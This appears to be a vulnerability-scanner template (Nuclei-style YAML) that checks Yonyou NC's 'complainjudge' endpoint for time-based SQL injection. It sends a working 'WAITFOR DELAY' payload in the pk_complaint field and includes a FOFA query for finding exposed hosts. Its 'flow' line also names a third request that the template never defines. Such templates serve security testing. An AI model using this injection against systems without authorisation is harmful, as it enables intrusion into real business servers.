id: poc-yaml-yongyou-complainjudge-sqli
info:
  name: "用友 NC complainjudge 接口 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 用友NC
  metadata:
    fingerprint: 'Yongyou NC'
    fofa: 'app="用友-UFIDA-NC"'
flow: http(1) && (http(2) || http(3))
http:
  - id: check-method-not-allowed
    method: GET
    path:
      - "{{BaseURL}}/ebvp/advorappcoll/complainjudge"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 405
      - type: word
        part: header
        words:
          - "Method Not Allowed"
  - id: time-based-sqli-test-1
    raw:
      - |
        POST /ebvp/advorappcoll/complainjudge HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:5%27--
      - |
        POST /ebvp/advorappcoll/complainjudge HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:8%27--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
      - type: word
        part: header
        words:
          - "Path=/ebvp/"
